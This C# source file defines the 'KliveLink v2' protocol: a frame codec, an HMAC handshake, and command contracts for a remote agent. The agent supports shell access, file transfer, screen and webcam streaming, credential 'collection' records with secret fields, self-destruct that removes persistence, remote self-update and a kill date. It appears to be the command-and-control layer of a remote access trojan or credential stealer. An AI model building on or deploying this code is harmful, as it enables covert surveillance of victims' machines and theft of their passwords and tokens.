using System.Buffers.Binary;
using System.Net.WebSockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace KliveLink.Contracts;

/// <summary>
/// KliveLink v2 wire protocol. Every message is a binary frame with a fixed header
/// and a UTF-8 JSON payload. The header carries type, stream and sequence so a
/// single socket can multiplex control, shell, file, screen and collection streams.
/// </summary>
public enum V2FrameType : byte
{
    Hello = 1,
    Challenge = 2,
    Auth = 3,
    Welcome = 4,
    Ping = 10,
    Pong = 11,
    Command = 20,
    Ack = 21,
    Result = 22,
    Cancel = 23,
    Error = 24,
    StreamOpen = 30,
    StreamData = 31,
    StreamEnd = 32,
    CollectionBegin = 40,
    CollectionChunk = 41,
    CollectionEnd = 42,
    ShellInput = 60,
    ShellOutput = 61,
    ShellClose = 62,
    Event = 50,
}

public enum V2CommandOperation
{
    GetSystemInfo,
    RunProcess,
    RunTerminalCommand,
    ListProcesses,
    KillProcess,
    ListDirectory,
    DownloadFile,
    UploadFile,
    ScreenStart,
    ScreenStop,
    CameraList,
    CameraStart,
    CameraStop,
    ShellOpen,
    ShellClose,
    StartCollection,
    CancelCollection,
    SelfDestruct,
    Disconnect,
    UpdateAgent,
    Ping,
}

public enum V2CommandStatus
{
    Ok,
    Failed,
    Timeout,
    Cancelled,
    Unsupported,
}

public enum V2CollectionTier
{
    T0,
    T1,
    T2,
}

public static class V2Json
{
    public static readonly JsonSerializerOptions Options = Create();

    private static JsonSerializerOptions Create()
    {
        var options = new JsonSerializerOptions(JsonSerializerDefaults.Web)
        {
            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
            WriteIndented = false,
        };
        options.Converters.Add(new JsonStringEnumConverter(JsonNamingPolicy.CamelCase));
        return options;
    }

    public static string Serialize<T>(T value) => JsonSerializer.Serialize(value, Options);
    public static T? Deserialize<T>(string json) => JsonSerializer.Deserialize<T>(json, Options);
}

public sealed class V2Frame
{
    public const ushort Magic = 0x4B4C;
    public const byte Version = 2;
    public const int HeaderSize = 28;
    public const int MaxPayload = 64 * 1024 * 1024;

    public V2FrameType Type { get; init; }
    public ushort Flags { get; init; }
    public uint StreamId { get; init; }
    public ulong Sequence { get; init; }
    public string Payload { get; init; } = "";

    public byte[] ToBytes()
    {
        byte[] payload = Encoding.UTF8.GetBytes(Payload ?? "");
        if (payload.Length > MaxPayload)
            throw new InvalidOperationException($"Payload exceeds {MaxPayload} bytes.");

        var frame = new byte[HeaderSize + payload.Length];
        BinaryPrimitives.WriteUInt16LittleEndian(frame.AsSpan(0, 2), Magic);
        frame[2] = Version;
        frame[3] = (byte)Type;
        BinaryPrimitives.WriteUInt16LittleEndian(frame.AsSpan(4, 2), Flags);
        BinaryPrimitives.WriteUInt16LittleEndian(frame.AsSpan(6, 2), HeaderSize);
        BinaryPrimitives.WriteUInt32LittleEndian(frame.AsSpan(8, 4), StreamId);
        BinaryPrimitives.WriteUInt64LittleEndian(frame.AsSpan(12, 8), Sequence);
        BinaryPrimitives.WriteUInt32LittleEndian(frame.AsSpan(20, 4), (uint)payload.Length);
        BinaryPrimitives.WriteUInt32LittleEndian(frame.AsSpan(24, 4), Checksum(frame.AsSpan(0, 24)));
        payload.CopyTo(frame.AsSpan(HeaderSize));
        return frame;
    }

    public static bool TryParse(ReadOnlySpan<byte> data, out V2Frame? frame, out int consumed)
    {
        frame = null;
        consumed = 0;
        if (data.Length < HeaderSize) return false;

        ushort magic = BinaryPrimitives.ReadUInt16LittleEndian(data[..2]);
        byte version = data[2];
        ushort headerSize = BinaryPrimitives.ReadUInt16LittleEndian(data.Slice(6, 2));
        uint payloadLength = BinaryPrimitives.ReadUInt32LittleEndian(data.Slice(20, 4));
        uint expected = BinaryPrimitives.ReadUInt32LittleEndian(data.Slice(24, 4));

        if (magic != Magic || version != Version || headerSize != HeaderSize || payloadLength > MaxPayload)
            throw new InvalidDataException("Invalid KliveLink v2 frame header.");
        if (Checksum(data[..24]) != expected)
            throw new InvalidDataException("Invalid KliveLink v2 header checksum.");
        if (data.Length < HeaderSize + payloadLength) return false;

        frame = new V2Frame
        {
            Type = (V2FrameType)data[3],
            Flags = BinaryPrimitives.ReadUInt16LittleEndian(data.Slice(4, 2)),
            StreamId = BinaryPrimitives.ReadUInt32LittleEndian(data.Slice(8, 4)),
            Sequence = BinaryPrimitives.ReadUInt64LittleEndian(data.Slice(12, 8)),
            Payload = Encoding.UTF8.GetString(data.Slice(HeaderSize, (int)payloadLength)),
        };
        consumed = HeaderSize + (int)payloadLength;
        return true;
    }

    private static uint Checksum(ReadOnlySpan<byte> header)
    {
        uint hash = 2166136261;
        foreach (byte b in header)
        {
            hash ^= b;
            hash *= 16777619;
        }
        return hash;
    }
}

public static class V2FrameCodec
{
    public static async Task<V2Frame> ReadFrameAsync(Stream stream, CancellationToken ct)
    {
        byte[] header = new byte[V2Frame.HeaderSize];
        await ReadExactAsync(stream, header, ct);
        ushort magic = BinaryPrimitives.ReadUInt16LittleEndian(header.AsSpan(0, 2));
        ushort headerSize = BinaryPrimitives.ReadUInt16LittleEndian(header.AsSpan(6, 2));
        uint payloadLength = BinaryPrimitives.ReadUInt32LittleEndian(header.AsSpan(20, 4));
        if (magic != V2Frame.Magic || headerSize != V2Frame.HeaderSize || payloadLength > V2Frame.MaxPayload)
            throw new InvalidDataException("Invalid KliveLink v2 frame.");

        byte[] payload = new byte[payloadLength];
        await ReadExactAsync(stream, payload, ct);
        byte[] full = new byte[header.Length + payload.Length];
        header.CopyTo(full, 0);
        payload.CopyTo(full, header.Length);
        if (!V2Frame.TryParse(full, out V2Frame? frame, out _) || frame == null)
            throw new InvalidDataException("Incomplete KliveLink v2 frame.");
        return frame;
    }

    public static async Task<V2Frame> ReadFrameAsync(WebSocket socket, CancellationToken ct)
    {
        byte[] header = new byte[V2Frame.HeaderSize];
        await ReceiveExactAsync(socket, header, ct);
        ushort magic = BinaryPrimitives.ReadUInt16LittleEndian(header.AsSpan(0, 2));
        ushort headerSize = BinaryPrimitives.ReadUInt16LittleEndian(header.AsSpan(6, 2));
        uint payloadLength = BinaryPrimitives.ReadUInt32LittleEndian(header.AsSpan(20, 4));
        if (magic != V2Frame.Magic || headerSize != V2Frame.HeaderSize || payloadLength > V2Frame.MaxPayload)
            throw new InvalidDataException("Invalid KliveLink v2 frame.");

        byte[] payload = new byte[payloadLength];
        await ReceiveExactAsync(socket, payload, ct);
        byte[] full = new byte[header.Length + payload.Length];
        header.CopyTo(full, 0);
        payload.CopyTo(full, header.Length);
        if (!V2Frame.TryParse(full, out V2Frame? frame, out _) || frame == null)
            throw new InvalidDataException("Incomplete KliveLink v2 frame.");
        return frame;
    }

    public static async Task SendAsync(WebSocket socket, V2Frame frame, CancellationToken ct)
    {
        byte[] bytes = frame.ToBytes();
        await socket.SendAsync(bytes.AsMemory(), WebSocketMessageType.Binary, true, ct);
    }

    private static async Task ReadExactAsync(Stream stream, byte[] buffer, CancellationToken ct)
    {
        int offset = 0;
        while (offset < buffer.Length)
        {
            int read = await stream.ReadAsync(buffer.AsMemory(offset), ct);
            if (read <= 0) throw new EndOfStreamException();
            offset += read;
        }
    }

    private static async Task ReceiveExactAsync(WebSocket socket, byte[] buffer, CancellationToken ct)
    {
        int offset = 0;
        while (offset < buffer.Length)
        {
            var result = await socket.ReceiveAsync(buffer.AsMemory(offset), ct);
            if (result.MessageType == WebSocketMessageType.Close)
                throw new WebSocketException("Socket closed.");
            offset += result.Count;
        }
    }
}

public sealed class V2Hello
{
    public string AgentId { get; set; } = "";
    public string MachineName { get; set; } = "";
    public string OsVersion { get; set; } = "";
    public string AgentVersion { get; set; } = "";
    public string Nonce { get; set; } = "";
    public string[] Capabilities { get; set; } = Array.Empty<string>();
}

public sealed class V2Challenge
{
    public string ServerNonce { get; set; } = "";
    public int HeartbeatSeconds { get; set; } = 30;
}

public sealed class V2Auth
{
    public string Proof { get; set; } = "";
}

public sealed class V2Welcome
{
    public string SessionId { get; set; } = "";
    public string ServerTime { get; set; } = "";
    public int HeartbeatSeconds { get; set; } = 30;
    public int MaxPayload { get; set; } = V2Frame.MaxPayload;
}

public sealed class V2Ping
{
    public long Timestamp { get; set; } = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
}

public sealed class V2Pong
{
    public long Timestamp { get; set; }
}

public sealed class V2Command
{
    public string CommandId { get; set; } = "";
    public V2CommandOperation Operation { get; set; }
    public int TimeoutMs { get; set; } = 30000;
    public string Payload { get; set; } = "{}";
}

public sealed class V2Ack
{
    public string CommandId { get; set; } = "";
    public bool Accepted { get; set; }
    public string? Message { get; set; }
}

public sealed class V2Result
{
    public string CommandId { get; set; } = "";
    public V2CommandStatus Status { get; set; } = V2CommandStatus.Ok;
    public string? Payload { get; set; }
    public string? Error { get; set; }
}

public sealed class V2Error
{
    public string? CommandId { get; set; }
    public string Code { get; set; } = "error";
    public string Message { get; set; } = "";
    public bool Retryable { get; set; }
}

public sealed class V2Cancel
{
    public string CommandId { get; set; } = "";
}

public sealed class V2StreamOpen
{
    public uint StreamId { get; set; }
    public string Kind { get; set; } = "";
    public string Metadata { get; set; } = "{}";
}

public sealed class V2StreamData
{
    public uint StreamId { get; set; }
    public string Base64 { get; set; } = "";
    public string Metadata { get; set; } = "{}";
}

public sealed class V2StreamEnd
{
    public uint StreamId { get; set; }
    public string? Error { get; set; }
}

public sealed class V2ShellInput
{
    public string Text { get; set; } = "";
}

public sealed class V2ShellOutput
{
    public string Text { get; set; } = "";
}

public sealed class V2CollectionBegin
{
    public string SnapshotId { get; set; } = "";
    public V2CollectionTier Tier { get; set; }
    public string Profile { get; set; } = "t0-fast";
    public string ManifestJson { get; set; } = "{}";
    public int RecordCount { get; set; }
}

public sealed class V2CollectionChunk
{
    public string SnapshotId { get; set; } = "";
    public int Sequence { get; set; }
    public string Base64 { get; set; } = "";
}

public sealed class V2CollectionEnd
{
    public string SnapshotId { get; set; } = "";
    public string Sha256 { get; set; } = "";
    public long Bytes { get; set; }
    public int RecordCount { get; set; }
    public string? Error { get; set; }
}

public sealed class V2CollectionRequest
{
    public string Profile { get; set; } = "t0-fast";
    public string[] Categories { get; set; } = Array.Empty<string>();
    public V2CollectionTier Tier { get; set; } = V2CollectionTier.T0;
    public long MaxBytes { get; set; } = 50 * 1024 * 1024;
}

public sealed class V2CollectionManifest
{
    public string SnapshotId { get; set; } = "";
    public string AgentId { get; set; } = "";
    public V2CollectionTier Tier { get; set; }
    public string Profile { get; set; } = "t0-fast";
    public DateTimeOffset StartedAt { get; set; }
    public DateTimeOffset CompletedAt { get; set; }
    public List<V2CollectionRecord> Records { get; set; } = new();
    public List<V2CollectionFile> Files { get; set; } = new();
    public List<string> Errors { get; set; } = new();
}

public sealed class V2CollectionRecord
{
    public string Collector { get; set; } = "";
    public string Category { get; set; } = "";
    public string SourcePath { get; set; } = "";
    public string Name { get; set; } = "";
    public string? Username { get; set; }
    public string? Secret { get; set; }
    public string? Url { get; set; }
    public DateTimeOffset? ExpiresAt { get; set; }
    public Dictionary<string, string>? Metadata { get; set; }
    public string? Sha256 { get; set; }
}

public sealed class V2CollectionFile
{
    public string Path { get; set; } = "";
    public string BundlePath { get; set; } = "";
    public string Sha256 { get; set; } = "";
    public long Size { get; set; }
}

public sealed class V2SystemInfo
{
    public string MachineName { get; set; } = "";
    public string OsVersion { get; set; } = "";
    public string UserName { get; set; } = "";
    public string Domain { get; set; } = "";
    public int ProcessorCount { get; set; }
    public long TotalMemoryMB { get; set; }
    public long FreeDiskMB { get; set; }
    public DateTimeOffset AgentStartTime { get; set; }
    public string AgentVersion { get; set; } = "";
    public string AgentId { get; set; } = "";
    public string[] Capabilities { get; set; } = Array.Empty<string>();
}

public sealed class V2RunProcessRequest
{
    public string FileName { get; set; } = "";
    public string Arguments { get; set; } = "";
    public string? WorkingDirectory { get; set; }
    public bool WaitForExit { get; set; } = false;
    public int TimeoutSeconds { get; set; } = 30;
}

public sealed class V2RunProcessResult
{
    public int? ExitCode { get; set; }
    public string StandardOutput { get; set; } = "";
    public string StandardError { get; set; } = "";
    public bool TimedOut { get; set; }
    public int ProcessId { get; set; }
}

public sealed class V2TerminalRequest
{
    public string Command { get; set; } = "";
    public string? WorkingDirectory { get; set; }
    public int TimeoutSeconds { get; set; } = 30;
}

public sealed class V2TerminalResult
{
    public int ExitCode { get; set; }
    public string Output { get; set; } = "";
    public string Error { get; set; } = "";
    public bool TimedOut { get; set; }
}

public sealed class V2ProcessInfo
{
    public int ProcessId { get; set; }
    public int? ParentProcessId { get; set; }
    public string ProcessName { get; set; } = "";
    public string? Path { get; set; }
    public long MemoryMB { get; set; }
}

public sealed class V2KillProcessRequest
{
    public int ProcessId { get; set; }
    public bool Tree { get; set; } = true;
}

public sealed class V2KillProcessResult
{
    public bool Success { get; set; }
    public string Message { get; set; } = "";
}

public sealed class V2ListDirectoryRequest
{
    public string Path { get; set; } = "";
}

public sealed class V2DirectoryEntry
{
    public string Name { get; set; } = "";
    public string FullPath { get; set; } = "";
    public bool IsDirectory { get; set; }
    public long SizeBytes { get; set; }
    public DateTimeOffset LastModified { get; set; }
}

public sealed class V2ListDirectoryResult
{
    public string Path { get; set; } = "";
    public List<V2DirectoryEntry> Entries { get; set; } = new();
    public string? Error { get; set; }
}

public sealed class V2DownloadFileRequest
{
    public string FilePath { get; set; } = "";
}

public sealed class V2DownloadFileResult
{
    public string FilePath { get; set; } = "";
    public string Base64Data { get; set; } = "";
    public long SizeBytes { get; set; }
    public string? Error { get; set; }
}

public sealed class V2UploadFileRequest
{
    public string DestinationPath { get; set; } = "";
    public string Base64Data { get; set; } = "";
}

public sealed class V2UploadFileResult
{
    public bool Success { get; set; }
    public string Message { get; set; } = "";
}

public sealed class V2ScreenStartRequest
{
    public int MonitorIndex { get; set; }
    public int Quality { get; set; } = 50;
    public int IntervalMs { get; set; } = 1000;
}

public sealed class V2CameraInfo
{
    public int Index { get; set; }
    public string Name { get; set; } = "";
}

public sealed class V2CameraStartRequest
{
    public int CameraIndex { get; set; }
    public int Quality { get; set; } = 70;
    public int IntervalMs { get; set; } = 250;
    public int Width { get; set; } = 1280;
    public int Height { get; set; } = 720;
}

public sealed class V2AgentStatus
{
    public string AgentId { get; set; } = "";
    public string MachineName { get; set; } = "";
    public DateTimeOffset ConnectedSince { get; set; }
    public bool IsScreenCaptureActive { get; set; }
    public string AgentVersion { get; set; } = "";
}

public sealed class V2SelfDestructResult
{
    public bool Acknowledged { get; set; }
    public string Message { get; set; } = "";
    public bool WatchdogStopped { get; set; }
    public bool RunKeyRemoved { get; set; }
    public Dictionary<string, bool> Checks { get; set; } = new();
}

public sealed class V2UpdateManifest
{
    public string Version { get; set; } = "";
    public string Url { get; set; } = "";
    public string Sha256 { get; set; } = "";
    public string? Signature { get; set; }
    public string RolloutRing { get; set; } = "stable";
    public string? MinVersion { get; set; }
    public DateTimeOffset? KillDate { get; set; }
}

public sealed class V2UpdateResult
{
    public bool Scheduled { get; set; }
    public string Message { get; set; } = "";
    public string Version { get; set; } = "";
}

public sealed class V2PurgeRequest
{
    public string AgentId { get; set; } = "";
    public bool KeepAudit { get; set; } = false;
    public bool DeleteRemote { get; set; } = false;
    public bool DeleteCollection { get; set; } = true;
    public string? IdempotencyKey { get; set; }
}

public sealed class V2PurgeJob
{
    public string JobId { get; set; } = "";
    public string AgentId { get; set; } = "";
    public string State { get; set; } = "queued";
    public DateTimeOffset CreatedAt { get; set; }
    public DateTimeOffset UpdatedAt { get; set; }
    public string DetailJson { get; set; } = "{}";
}

public static class V2Proof
{
    public static string Compute(string token, string agentId, string clientNonce, string serverNonce)
    {
        byte[] key = Encoding.UTF8.GetBytes(token);
        byte[] data = Encoding.UTF8.GetBytes($"{agentId}|{clientNonce}|{serverNonce}");
        using var hmac = new HMACSHA256(key);
        return Convert.ToBase64String(hmac.ComputeHash(data));
    }

    public static string Sha256Hex(string value)
        => Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(value))).ToLowerInvariant();
}

public static class V2Capabilities
{
    public static readonly string[] All =
    {
        "sysinfo", "process", "terminal", "files", "screen", "camera", "collection.t0",
        "collection.t1", "collection.t2", "selfdestruct", "purge",
    };
}
